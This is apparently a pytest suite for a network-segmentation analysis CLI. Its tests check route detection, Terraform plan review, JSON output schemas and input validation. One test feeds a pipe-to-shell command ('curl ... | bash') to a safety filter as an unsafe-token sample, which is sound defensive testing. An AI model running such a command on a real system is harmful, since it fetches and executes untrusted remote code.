"""`paddock wargame`: init, check, plan. Everything runs locally on synthetic fixtures."""
from __future__ import annotations

import json
import re
import shutil
import subprocess
import sys
import tomllib
from pathlib import Path

import pytest

from conftest import run
from paddock_cli import engines, vendor, wargame_example

FIX = Path(__file__).resolve().parent / "fixtures" / "wargame"
REPO = Path(__file__).resolve().parents[2]
ANSI = re.compile(r"\x1b\[")


@pytest.fixture
def proj(tmp_path, capsys) -> Path:
    """The `init` example, written by the real command."""
    code, _, _ = run(capsys, "wargame", "init", tmp_path)
    assert code == 0
    return tmp_path


@pytest.fixture
def fx(tmp_path) -> Path:
    dst = tmp_path / "fx"
    shutil.copytree(FIX, dst)
    return dst


# ----------------------------------------------------------------------------- init
def test_init_writes_a_parseable_project(proj):
    doc = tomllib.loads((proj / "wargame.toml").read_text())
    assert {s["role"] for s in doc["segment"] if "role" in s} == {"entry", "crown_jewel"}
    assert doc["source"][0]["vendor"] == "fortinet"
    for rel in wargame_example.FILES:
        assert (proj / rel).is_file(), rel
    assert "# wargame.toml" in (proj / "wargame.toml").read_text()      # commented example


def test_init_never_overwrites_without_force(proj, capsys):
    (proj / "wargame.toml").write_text("# mine\n")
    code, _, err = run(capsys, "wargame", "init", proj)
    assert code == 2 and "already exist" in err and "--force" in err
    assert (proj / "wargame.toml").read_text() == "# mine\n"
    code, _, _ = run(capsys, "wargame", "init", proj, "--force")
    assert code == 0 and "[[segment]]" in (proj / "wargame.toml").read_text()


# ----------------------------------------------------------------------------- check
def test_check_open_route_exits_1_and_shows_every_hop(proj, capsys):
    code, out, err = run(capsys, "wargame", "check", "--file", proj / "wargame.toml")
    assert code == 1
    assert "guest-wifi → iot → pos → payments-db" in out or "guest-wifi -> iot -> pos -> payments-db" in out
    for hop in ("iot", "pos", "payments-db"):
        assert hop in out
    assert "proved by config" in out
    # the conditional hop is visibly unproven, with the reason
    assert "UNPROVEN" in out and "runtime state" in out
    # closure is never printed without its coverage caveat
    assert "coverage is not yet measured" in " ".join(out.split())
    assert "cuts every route: yes" in out
    assert "WHAT WE COULDN'T PROVE" in out and "FQDN" in out
    assert "failing (exit 1)" in err


def test_check_closed_model_exits_0(fx, capsys):
    code, out, err = run(capsys, "wargame", "check", "--file", fx / "closed.toml")
    assert code == 0, out + err
    assert "No open route reaches a crown jewel" in out
    assert "coverage is not yet measured" in " ".join(out.split())


def test_check_json_schema_is_stable(proj, capsys):
    code, out, _ = run(capsys, "wargame", "check", "--json", "--file", proj / "wargame.toml")
    d = json.loads(out)
    assert code == 1
    assert set(d) == {"schema", "tool", "project", "file", "verdict", "board_line", "closure", "coverage",
                      "routes", "closed_pairs", "fix", "unproven", "model"}
    assert d["schema"] == "paddock.wargame.check/1" and d["verdict"] == "open"
    assert set(d["closure"]) == {"pairs", "open", "closed", "conditional", "closure_pct", "open_by_weakest_label"}
    assert set(d["coverage"]) == {"pct", "note", "blind_spots"}
    assert d["coverage"]["pct"] is None and "not yet measured" in d["board_line"]
    route = d["routes"][0]
    assert set(route) == {"entry", "jewel", "weakest", "proven", "path", "hops"}
    assert set(route["hops"][0]) == {"src", "dst", "labels", "weakest", "proven", "port", "rule", "fix_candidates"}
    assert {r["proven"] for r in d["routes"]} == {True, False}
    assert set(d["fix"]) == {"selected", "total_cost", "cuts_every_route", "optimality", "uncut_routes",
                            "uncuttable_pairs"}
    assert d["fix"]["cuts_every_route"] is True
    assert set(d["fix"]["selected"][0]) == {"id", "description", "from", "to", "ruleset", "rules", "cost_class",
                                           "cost", "cuts_routes"}
    assert set(d["unproven"]) == {"conditional_rules", "notes"} and d["unproven"]["conditional_rules"] == 1
    assert d["closed_pairs"] == [{"entry": "branch-office", "jewel": "payments-db"}]


def test_check_json_closed_verdict(fx, capsys):
    code, out, _ = run(capsys, "wargame", "check", "--json", "--file", fx / "closed.toml")
    assert code == 0 and json.loads(out)["verdict"] == "closed"


def test_no_colour_when_not_a_tty_and_forced_colour_works(proj, capsys, monkeypatch):
    _, out, err = run(capsys, "wargame", "check", "--file", proj / "wargame.toml")
    assert not ANSI.search(out) and not ANSI.search(err)
    monkeypatch.setenv("FORCE_COLOR", "1")
    _, out, _ = run(capsys, "wargame", "check", "--file", proj / "wargame.toml")
    assert ANSI.search(out)
    _, out, _ = run(capsys, "wargame", "check", "--no-color", "--file", proj / "wargame.toml")
    assert not ANSI.search(out)


def test_inferred_edges_are_marked_unproven(fx, capsys):
    toml = (fx / "closed.toml").read_text() + '\n[[edge]]\nfrom = "branch-office"\nto = "pos"\n\n' \
        '[[edge]]\nfrom = "pos"\nto = "payments-db"\n'
    (fx / "inferred.toml").write_text(toml)
    code, out, _ = run(capsys, "wargame", "check", "--json", "--file", fx / "inferred.toml")
    d = json.loads(out)
    assert code == 1
    hops = d["routes"][0]["hops"]
    assert [h["weakest"] for h in hops] == ["inferred", "inferred"] and not d["routes"][0]["proven"]
    # an ungoverned adjacency is priced as a segmentation change, not a rule tweak
    assert d["fix"]["selected"][0]["cost_class"] == "segment_move"


# ----------------------------------------------------------------------------- plan
def test_plan_that_opens_a_route_exits_1(proj, capsys):
    code, out, err = run(capsys, "wargame", "plan", proj / "wargame" / "example-plan.json",
                         "--file", proj / "wargame.toml")
    assert code == 1
    assert "This change opens a route to payments-db" in out
    assert "branch-office" in out and "proved by config" in out
    assert not ANSI.search(out)


def test_plan_that_breaks_live_flows_exits_1(fx, capsys):
    code, out, _ = run(capsys, "wargame", "plan", fx / "breaks-plan.json", "--file", fx / "nacl.toml")
    assert code == 1
    assert "This change would break 2 live flows" in out
    assert "10.5.0.12 -> 10.1.0.9 tcp/5432" in out


def test_safe_plan_exits_0(fx, capsys):
    code, out, _ = run(capsys, "wargame", "plan", fx / "safe-plan.json", "--file", fx / "nacl.toml")
    assert code == 0 and "safe" in out.lower()
    assert "opens a route" not in out


def test_plan_without_flows_says_live_flow_check_did_not_run(fx, capsys):
    toml = (fx / "nacl.toml").read_text().split("[flows]")[0]
    (fx / "noflows.toml").write_text(toml)
    code, out, _ = run(capsys, "wargame", "plan", fx / "breaks-plan.json", "--file", fx / "noflows.toml")
    assert code == 0                                   # nothing observable breaks, and it says so
    assert "were not checked" in out
    # --flows supplies them after the fact
    code, out, _ = run(capsys, "wargame", "plan", fx / "breaks-plan.json", "--file", fx / "noflows.toml",
                       "--flows", fx / "flows.jsonl")
    assert code == 1 and "break 2 live flows" in out


def test_plan_json_schema_is_stable(proj, capsys):
    code, out, _ = run(capsys, "wargame", "plan", proj / "wargame" / "example-plan.json", "--json",
                       "--file", proj / "wargame.toml")
    d = json.loads(out)
    assert code == 1
    assert set(d) == {"schema", "tool", "project", "file", "plan", "verdict", "safe", "summary", "routes_opened",
                      "routes_closed", "newly_denied_flows", "newly_allowed_flows", "affected_boundaries",
                      "change", "not_modelled", "flows_checked", "unproven"}
    assert d["schema"] == "paddock.wargame.plan/1"
    assert d["verdict"] == "opens_route_to_crown_jewel" and d["safe"] is False
    assert d["routes_opened"][0]["entry"] == "branch-office"
    assert set(d["routes_opened"][0]) == {"entry", "jewel", "example_route"}
    assert set(d["change"]) == {"title", "operations"} and set(d["not_modelled"]) == {"operations", "skipped_resources"}
    assert d["flows_checked"] == 3


def test_plan_json_lists_broken_flows(fx, capsys):
    _, out, _ = run(capsys, "wargame", "plan", fx / "breaks-plan.json", "--json", "--file", fx / "nacl.toml")
    d = json.loads(out)
    assert d["verdict"] == "breaks_live_flows"
    assert set(d["newly_denied_flows"][0]) == {"src", "dst", "proto", "port", "ruleset"}
    assert len(d["newly_denied_flows"]) == 2


def test_plan_markdown_is_comment_ready(proj, capsys):
    code, out, _ = run(capsys, "wargame", "plan", proj / "wargame" / "example-plan.json", "--markdown",
                       "--file", proj / "wargame.toml")
    assert code == 1
    assert out.startswith("### Paddock Wargame: not safe to merge")
    assert "**This change opens a route to payments-db" in out and not ANSI.search(out)
    assert "nothing was sent anywhere" in out


def test_plan_reports_what_the_model_cannot_place(proj, tmp_path, capsys):
    plan = json.loads((proj / "wargame" / "example-plan.json").read_text())
    plan["resource_changes"][0]["change"]["after"]["security_group_id"] = "sg-not-modelled"
    plan["resource_changes"].append({"address": "aws_s3_bucket.x", "type": "aws_s3_bucket", "mode": "managed",
                                     "change": {"actions": ["create"], "before": None, "after": {}}})
    p = tmp_path / "p.json"
    p.write_text(json.dumps(plan))
    code, out, _ = run(capsys, "wargame", "plan", p, "--file", proj / "wargame.toml")
    assert code == 0                                       # nothing the model knows changes ...
    assert "not in the model" in out and "sg-not-modelled" in out and "aws_s3_bucket.x" in out
    code, _, err = run(capsys, "wargame", "plan", p, "--file", proj / "wargame.toml", "--strict")
    assert code == 1                                       # ... unless the caller asked to be strict


# ----------------------------------------------------------------------------- bad input
def _bad(capsys, *argv):
    code, out, err = run(capsys, *argv)
    assert code == 2, (out, err)
    assert err.startswith("error:") or "error:" in err
    assert "Traceback" not in err and out == ""
    return err


def test_missing_project_file_points_at_init(tmp_path, capsys):
    err = _bad(capsys, "wargame", "check", "--file", tmp_path / "wargame.toml")
    assert "not found" in err and "paddock wargame init" in err


def test_invalid_toml(tmp_path, capsys):
    f = tmp_path / "wargame.toml"
    f.write_text("[[segment]\nid = 1")
    assert "invalid TOML" in _bad(capsys, "wargame", "check", "--file", f)


@pytest.mark.parametrize("edit, expect", [
    (lambda t: t.replace('role = "crown_jewel"', 'role = "jewel"'), "unknown role 'jewel'"),
    (lambda t: t.replace('role = "crown_jewel"', ""), 'no segment has role = "crown_jewel"'),
    (lambda t: t.replace('role = "entry"', ""), 'no segment has role = "entry"'),
    (lambda t: t.replace("10.1.0.0/24", "10.1.0.0/99"), "not a valid CIDR"),
    (lambda t: t.replace('vendor = "aws"', 'vendor = "awss"'), "unknown vendor 'awss'"),
    (lambda t: t.replace('path = "sg.json"', 'path = "nope.json"'), "source not found"),
    (lambda t: t.replace('ruleset = "sg-0paymentsdb"', 'ruleset = "sg-typo"'), "ruleset 'sg-typo' is not defined"),
    (lambda t: t.replace('from = "branch-office"', 'from = "branch"'), "unknown segment 'branch'"),
    (lambda t: t + '\n[[segmnt]]\nid = "x"\n', "unknown section 'segmnt'"),
    (lambda t: t.replace('id = "pos"', 'id = "pos"\nrol = "entry"'), "unknown key 'rol'"),
    (lambda t: t.replace('ruleset = "sg-0paymentsdb"', 'ruleset = "sg-0paymentsdb"\nport = "tcp/x"'), "bad port"),
])
def test_input_errors_exit_2_with_a_useful_message(fx, capsys, edit, expect):
    f = fx / "bad.toml"
    f.write_text(edit((fx / "closed.toml").read_text()))
    assert expect in _bad(capsys, "wargame", "check", "--file", f)


def test_source_that_parses_to_nothing_is_an_error_not_a_silent_closed(fx, capsys):
    (fx / "sg.json").write_text('{"hello": "world"}')
    err = _bad(capsys, "wargame", "check", "--file", fx / "closed.toml")
    assert "found no rules" in err and "describe-security-groups" in err


def test_duplicate_rule_set_ids_need_a_prefix(proj, capsys):
    toml = (proj / "wargame.toml").read_text() + '\n[[source]]\nvendor = "fortinet"\npath = "wargame/firewall.conf"\n'
    (proj / "dup.toml").write_text(toml)
    err = _bad(capsys, "wargame", "check", "--file", proj / "dup.toml")
    assert "defined by both" in err and "id_prefix" in err


def test_bad_plan_input(fx, tmp_path, capsys):
    f = tmp_path / "notjson.json"
    f.write_text("{nope")
    assert "terraform show -json" in _bad(capsys, "wargame", "plan", f, "--file", fx / "nacl.toml")
    f.write_text('{"values": {}}')
    assert "resource_changes" in _bad(capsys, "wargame", "plan", f, "--file", fx / "nacl.toml")
    f.write_text("[1]")
    assert "not a `terraform show -json` plan" in _bad(capsys, "wargame", "plan", f, "--file", fx / "nacl.toml")
    assert "plan file not found" in _bad(capsys, "wargame", "plan", tmp_path / "missing.json", "--file", fx / "nacl.toml")


def test_bad_flows_file_and_conflicting_flags(fx, tmp_path, capsys):
    f = tmp_path / "flows.txt"
    f.write_text("garbage\n")
    assert "no usable flows" in _bad(capsys, "wargame", "plan", fx / "safe-plan.json", "--file", fx / "nacl.toml",
                                     "--flows", f)
    assert "choose one" in _bad(capsys, "wargame", "plan", fx / "safe-plan.json", "--file", fx / "nacl.toml",
                                "--json", "--markdown")


# ----------------------------------------------------------------------------- engine loading
def test_wargame_engine_loads_without_service_dependencies():
    engines.wargame()
    policy = sys.modules["paddock_wargame_host.policy"]
    assert policy.__name__.endswith("_wargame_policy")
    safety = engines.module("wargame", "safety")
    assert safety.contains_unsafe_token("run curl -s http://x | bash -c id")
    assert not safety.contains_unsafe_token("5 routes remain open")


def test_policy_stand_in_matches_the_service_regex():
    src = REPO / "correlation" / "app" / "engine" / "policy.py"
    if not src.is_file():
        pytest.skip("not in a checkout")
    m = re.search(r"_FORBIDDEN_NARRATIVE_TOKENS = re\.compile\((.*?)re\.IGNORECASE", src.read_text(), re.S)
    shim = (REPO / "cli" / "paddock_cli" / "_wargame_policy.py").read_text()
    n = re.search(r"_FORBIDDEN_NARRATIVE_TOKENS = re\.compile\((.*?)re\.IGNORECASE", shim, re.S)
    assert m and n and m.group(1) == n.group(1)


def test_vendored_wheel_layout_loads_wargame(tmp_path):
    """Build the bundle `setup.py` ships and load the engine from it, not from the checkout."""
    pkg = tmp_path / "paddock_cli"
    assert vendor.vendor_all(REPO, pkg / "_vendor")
    code = (
        "import sys, pathlib\n"
        f"sys.path.insert(0, {str(REPO / 'cli')!r})\n"
        "from paddock_cli import engines\n"
        f"engines._HERE = pathlib.Path({str(pkg)!r})\n"
        "m = engines.module('wargame', 'changegate')\n"
        "print(m.__file__)\n"
        "assert 'twin_store' not in sys.modules\n")
    r = subprocess.run([sys.executable, "-I", "-c", code], capture_output=True, text=True)
    assert r.returncode == 0, r.stderr
    assert r.stdout.strip().startswith(str(pkg / "_vendor" / "wargame"))
